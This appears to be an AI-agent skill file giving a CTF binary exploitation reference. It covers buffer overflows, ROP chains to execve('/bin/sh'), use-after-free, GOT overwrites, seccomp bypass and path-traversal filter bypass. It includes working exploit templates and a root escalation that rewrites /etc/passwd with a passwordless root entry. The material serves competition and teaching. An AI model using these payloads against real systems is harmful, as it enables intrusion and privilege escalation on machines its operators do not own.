---
name: ctf-pwn
description: Binary exploitation (pwn) techniques for CTF challenges. Use when exploiting buffer overflows, format strings, heap vulnerabilities, race conditions, or kernel bugs.
user-invocable: false
allowed-tools: ["Bash", "Read", "Write", "Edit", "Glob", "Grep", "Task", "WebFetch", "WebSearch"]
---

# CTF Binary Exploitation (Pwn)

Quick reference for pwn challenges. For detailed techniques, see supporting files.

## Additional Resources

- [format-string.md](format-string.md) - Format string exploitation (leaks, GOT overwrite, blind pwn, filter bypass)
- [advanced.md](advanced.md) - Advanced techniques (heap, JIT, esoteric GOT, custom allocators, DNS overflow, MD5 preimage, .fini_array, shell tricks, ASAN)

---

## Source Code Red Flags

- Threading/`pthread` → race conditions
- `usleep()`/`sleep()` → timing windows
- Global variables in multiple threads → TOCTOU

## Race Condition Exploitation

```bash
bash -c '{ echo "cmd1"; echo "cmd2"; sleep 1; } | nc host port'
```

## Common Vulnerabilities

- Buffer overflow: `gets()`, `scanf("%s")`, `strcpy()`
- Format string: `printf(user_input)`
- Integer overflow, UAF, race conditions

## Kernel Exploitation

- Look for vulnerable `lseek` handlers allowing OOB read/write
- Heap grooming with forked processes
- SUID binary exploitation via kernel-to-userland buffer overflow
- Check kernel config for disabled protections:
  - `CONFIG_SLAB_FREELIST_RANDOM=n` → sequential heap chunks
  - `CONFIG_SLAB_MERGE_DEFAULT=n` → predictable allocations

## FUSE/CUSE Character Device Exploitation

**FUSE** (Filesystem in Userspace) / **CUSE** (Character device in Userspace)

**Identification:**
- Look for `cuse_lowlevel_main()` or `fuse_main()` calls
- Device operations struct with `open`, `read`, `write` handlers
- Device name registered via `DEVNAME=backdoor` or similar

**Common vulnerability patterns:**
```c
// Backdoor pattern: write handler with command parsing
void backdoor_write(const char *input, size_t len) {
    char *cmd = strtok(input, ":");
    char *file = strtok(NULL, ":");
    char *mode = strtok(NULL, ":");
    if (!strcmp(cmd, "b4ckd00r")) {
        chmod(file, atoi(mode));  // Arbitrary chmod!
    }
}
```

**Exploitation:**
```bash
# Change /etc/passwd permissions via custom device
echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor

# 511 decimal = 0777 octal (rwx for all)
# Now modify passwd to get root
echo "root::0:0:root:/root:/bin/sh" > /etc/passwd
su root
```

**Privilege escalation via passwd modification:**
1. Make `/etc/passwd` writable via the backdoor
2. Replace root line with `root::0:0:root:/root:/bin/sh` (no password)
3. `su root` without password prompt

## Busybox/Restricted Shell Escalation

When in restricted environment without sudo:
1. Find writable paths via character devices
2. Target system files: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
3. Modify permissions then content to gain root

## Protection Implications for Exploit Strategy

| Protection | Status | Implication |
|-----------|--------|-------------|
| PIE | Disabled | All addresses (GOT, PLT, functions) are fixed - direct overwrites work |
| RELRO | Partial | GOT is writable - GOT overwrite attacks possible |
| RELRO | Full | GOT is read-only - need alternative targets (hooks, vtables, return addr) |
| NX | Enabled | Can't execute shellcode on stack/heap - use ROP or ret2win |
| Canary | Present | Stack smash detected - need leak or avoid stack overflow (use heap) |

**Quick decision tree:**
- Partial RELRO + No PIE → GOT overwrite (easiest, use fixed addresses)
- Full RELRO → target `__free_hook`, `__malloc_hook` (glibc < 2.34), or return addresses
- Stack canary present → prefer heap-based attacks or leak canary first

## Stack Buffer Overflow

1. Find offset to return address: `cyclic 200` then `cyclic -l <value>`
2. Check protections: `checksec --file=binary`
3. No PIE + No canary = direct ROP
4. Canary leak via format string or partial overwrite

### ret2win with Parameter (Magic Value Check)

**Pattern:** Win function checks argument against magic value before printing flag.

```c
// Common pattern in disassembly
void win(long arg) {
    if (arg == 0x1337c0decafebeef) {  // Magic check
        // Open and print flag
    }
}
```

**Exploitation (x86-64):**
```python
from pwn import *

# Find gadgets
pop_rdi_ret = 0x40150b   # pop rdi; ret
ret = 0x40101a           # ret (for stack alignment)
win_func = 0x4013ac
magic = 0x1337c0decafebeef

offset = 112 + 8  # = 120 bytes to reach return address

payload = b"A" * offset
payload += p64(ret)        # Stack alignment (Ubuntu/glibc requires 16-byte)
payload += p64(pop_rdi_ret)
payload += p64(magic)
payload += p64(win_func)
```

**Finding the win function:**
- Search for `fopen("flag.txt")` or similar in Ghidra
- Look for functions with no XREF that check a magic parameter
- Check for conditional print/exit patterns after parameter comparison

### Stack Alignment (16-byte Requirement)

Modern Ubuntu/glibc requires 16-byte stack alignment before `call` instructions. Symptoms of misalignment:
- SIGSEGV in `movaps` instruction (SSE requires alignment)
- Crash inside libc functions (printf, system, etc.)

**Fix:** Add extra `ret` gadget before your ROP chain:
```python
payload = b"A" * offset
payload += p64(ret)        # Align stack to 16 bytes
payload += p64(pop_rdi_ret)
# ... rest of chain
```

### Offset Calculation from Disassembly

```asm
push   %rbp
mov    %rsp,%rbp
sub    $0x70,%rsp        ; Stack frame = 0x70 (112) bytes
...
lea    -0x70(%rbp),%rax  ; Buffer at rbp-0x70
mov    $0xf0,%edx        ; read() size = 240 (overflow!)
```

**Calculate offset:**
- Buffer starts at `rbp - buffer_offset` (e.g., rbp-0x70)
- Saved RBP is at `rbp` (0 offset from buffer end)
- Return address is at `rbp + 8`
- **Total offset = buffer_offset + 8** = 112 + 8 = 120 bytes

### Input Filtering (memmem checks)

Some challenges filter input using `memmem()` to block certain strings:
```python
payload = b"A" * 120 + p64(gadget) + p64(value)
assert b"badge" not in payload and b"token" not in payload
```

### Finding Gadgets

```bash
# Find pop rdi; ret
objdump -d binary | grep -B1 "pop.*rdi"
ROPgadget --binary binary | grep "pop rdi"

# Find simple ret (for alignment)
objdump -d binary | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"
```

### Hidden Gadgets in CMP Immediates

CMP instructions with large immediates encode useful byte sequences. pwntools `ROP()` finds these automatically:

```asm
# Example: cmpl $0xc35e415f, -0x4(%rbp)
# Bytes: 81 7d fc 5f 41 5e c3
#                  ^^ ^^ ^^ ^^
# At +3: 5f 41 5e c3 = pop rdi; pop r14; ret
# At +4: 41 5e c3    = pop r14; ret
# At +5: 5e c3       = pop rsi; ret
```

**When to look:** Small binaries with few functions often lack standard gadgets. Check `cmp`, `mov`, and `test` instructions with large immediates — their operand bytes may decode as useful gadgets.

```python
rop = ROP(elf)
# pwntools finds these automatically
for addr, gadget in rop.gadgets.items():
    print(hex(addr), gadget)
```

## Struct Pointer Overwrite (Heap Menu Challenges)

**Pattern:** Menu-based programs with create/modify/delete/view operations on structs containing both data buffers and pointers. The modify/edit function reads more bytes than the data buffer, overflowing into adjacent pointer fields.

**Struct layout example:**
```c
struct Student {
    char name[36];      // offset 0x00 - data buffer
    int *grade_ptr;     // offset 0x24 - pointer to separate allocation
    float gpa;          // offset 0x28
};  // total: 0x2c (44 bytes)
```

**Exploitation:**
```python
from pwn import *

WIN = 0x08049316
GOT_TARGET = 0x0804c00c  # printf@GOT

# 1. Create object (allocates struct + sub-allocations)
create_student("AAAA", 5, 3.5)

# 2. Modify name - overflow into pointer field with GOT address
payload = b'A' * 36 + p32(GOT_TARGET)  # 36 bytes padding + GOT addr
modify_name(0, payload)

# 3. Modify grade - scanf("%d", corrupted_ptr) writes to GOT
modify_grade(0, str(WIN))  # Writes win addr as int to GOT entry

# 4. Trigger overwritten function -> jumps to win
```

**GOT target selection strategy:**
- Identify which libc functions the `win` function calls internally
- Do NOT overwrite GOT entries for functions used by `win` (causes infinite recursion/crash)
- Prefer functions called in the main loop AFTER the write

| Win uses | Safe GOT targets |
|----------|-------------------|
| puts, fopen, fread, fclose, exit | printf, free, getchar, malloc, scanf |
| printf, system | puts, exit, free |
| system only | puts, printf, exit |

## ROP Chain Building

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Common gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Leak libc
payload = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
```

### Two-Stage ret2libc (Leak + Shell)

When exploiting in two stages, choose the return target for stage 2 carefully:

```python
# Stage 1: Leak libc via puts@PLT, then re-enter vuln for stage 2
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main

# IMPORTANT: Return target after leak
# - Returning to main may crash if check_status/setup corrupts stack
# - Returning to vuln directly may have stack issues
# - Best: return to the 'call vuln' instruction in main (e.g., 0x401239)
#   This sets up a clean stack frame via the CALL instruction
```

**Leak parsing with no-newline printf:**
```python
# If printf("Laundry complete") has no trailing newline,
# puts() leak appears right after it on the same line:
# Output: "Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
p.recvuntil(b'Laundry complete')
leaked = p.recvline().strip()
libc_addr = u64(leaked.ljust(8, b'\x00'))
```

### Raw Syscall ROP (When system() Fails)

If calling `system()` or `execve()` via libc function entry crashes (CET/IBT, stack issues), use raw `syscall` instruction from libc gadgets:

```python
# Find gadgets in libc
libc_rop = ROP(libc)
pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # common in modern glibc
syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]

# execve("/bin/sh", NULL, NULL) = syscall 59
payload = b'A' * offset
payload += p64(libc_base + pop_rax)
payload += p64(59)
payload += p64(libc_base + pop_rdi)
payload += p64(libc_base + next(libc.search(b'/bin/sh')))
payload += p64(libc_base + pop_rsi)
payload += p64(0)
payload += p64(libc_base + pop_rdx_rbx)
payload += p64(0)
payload += p64(0)  # rbx junk
payload += p64(libc_base + syscall_ret)
```

**When to use raw syscall vs libc functions:**
- `system()` through libc: simplest, but may crash due to stack alignment or CET
- `execve()` through libc: avoids `system()`'s subprocess overhead, same CET risk
- Raw `syscall`: bypasses all libc function prologues, most reliable for ROP
- Note: `pop rdx; ret` is rare in modern libc; look for `pop rdx; pop rbx; ret` instead

### Shell Interaction After execve

After spawning a shell via ROP, the shell reads from the same stdin as the binary. Commands sent too early may be consumed by prior `read()` calls.

```python
p.send(payload)  # Trigger execve

# Wait for shell to initialize before sending commands
import time
time.sleep(1)
p.sendline(b'id')
time.sleep(0.5)
result = p.recv(timeout=3)

# For flag retrieval:
p.sendline(b'cat /flag* flag* 2>/dev/null')
time.sleep(0.5)
flag = p.recv(timeout=3)

# DON'T pipe commands via stdin when using pwntools - they get consumed
# by earlier read() calls. Use explicit sendline() after delays instead.
```

## Pwntools Template

```python
from pwn import *

context.binary = elf = ELF('./binary')
context.log_level = 'debug'

def conn():
    if args.REMOTE:
        return remote('host', port)
    return process('./binary')

io = conn()
# exploit here
io.interactive()
```

## Useful Commands

```bash
one_gadget libc.so.6           # Find one-shot gadgets
ropper -f binary               # Find ROP gadgets
ROPgadget --binary binary      # Alternative gadget finder
seccomp-tools dump ./binary    # Check seccomp rules
```

## Use-After-Free (UAF) Exploitation

**Pattern:** Menu-based programs with create/delete/view operations where `free()` doesn't NULL the pointer.

**Classic UAF flow:**
1. Create object A (allocates chunk with function pointer)
2. Leak address via inspect/view (bypass PIE)
3. Free object A (creates dangling pointer)
4. Allocate object B of **same size** (reuses freed chunk via tcache)
5. Object B data overwrites A's function pointer with `win()` address
6. Trigger A's callback → jumps to `win()`

**Key insight:** Both structs must be the same size for tcache to reuse the chunk.

```python
# UAP Watch pattern
create_report("sighting-0")  # 64-byte struct with callback ptr at +56
leak = inspect_report(0)      # Leak callback address for PIE bypass
pie_base = leak - redaction_offset
win_addr = pie_base + win_offset

delete_report(0)              # Free chunk, dangling pointer remains
# Allocate same-size struct, overwriting callback
create_signal(b"A"*56 + p64(win_addr))
analyze_report(0)             # Calls dangling pointer → win()
```

## Seccomp Bypass

Alternative syscalls when seccomp blocks `open()`/`read()`:
- `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`

**Check rules:** `seccomp-tools dump ./binary`

See [advanced.md](advanced.md) for: conditional buffer address restrictions, shellcode construction without relocations (call/pop trick), seccomp analysis from disassembly, `scmp_arg_cmp` struct layout.

## Stack Shellcode with Input Reversal

**Pattern (Scarecode):** Binary reverses input buffer before returning.

**Strategy:**
1. Leak address via info-leak command (bypass PIE)
2. Find `sub rsp, 0x10; jmp *%rsp` gadget
3. Pre-reverse shellcode and RIP overwrite bytes
4. Use partial 6-byte RIP overwrite (avoids null bytes from canonical addresses)
5. Place trampoline (`jmp short`) to hop back into NOP sled + shellcode

**Null-byte avoidance with `scanf("%s")`:**
- Can't embed `\x00` in payload
- Use partial pointer overwrite (6 bytes) — top 2 bytes match since same mapping
- Use short jumps and NOP sleds instead of multi-address ROP chains

## Path Traversal Sanitizer Bypass

**Pattern (Galactic Archives):** Sanitizer skips character after finding banned char.

```python
# Sanitizer removes '.' and '/' but skips next char after match
# ../../etc/passwd → bypass with doubled chars:
"....//....//etc//passwd"
# Each '..' becomes '....' (first '.' caught, second skipped, third caught, fourth survives)
```

**Flag via `/proc/self/fd/N`:**
- If binary opens flag file but doesn't close fd, read via `/proc/self/fd/3`
- fd 0=stdin, 1=stdout, 2=stderr, 3=first opened file

## Global Buffer Overflow (CSV Injection)

**Pattern (Spreadsheet):** Overflow adjacent global variables via extra CSV delimiters to change filename pointer. See [advanced.md](advanced.md) for full exploit pattern.

## MD5 Preimage Gadget Construction

**Pattern (Hashchain, Nullcon 2026):** Brute-force MD5 preimages with `eb 0c` prefix (jmp +12) to skip middle bytes, using bytes 14-15 as 2-byte i386 instructions. Build syscall chains from gadgets like `31c0` (xor eax), `cd80` (int 0x80).

See [advanced.md](advanced.md) for C brute-force code, gadget list, and v2 (4-byte prefix) technique.

## .fini_array Hijack

**When to use:** Writable `.fini_array` + arbitrary write primitive. When `main()` returns, entries called as function pointers. Works even with Full RELRO. Overwrite with `%hn` writes to shellcode/win address.

See [advanced.md](advanced.md) for implementation details.

## Shell Tricks

**Quick reference:**
- `exec<&3;sh>&3` - redirect stdin/stdout to fd 3 (common network socket)
- `ls -la /proc/self/fd` - find correct fd
- `sh<&3 >&3` or `$0` instead of `sh` - minimal alternatives

See [advanced.md](advanced.md) for more details.
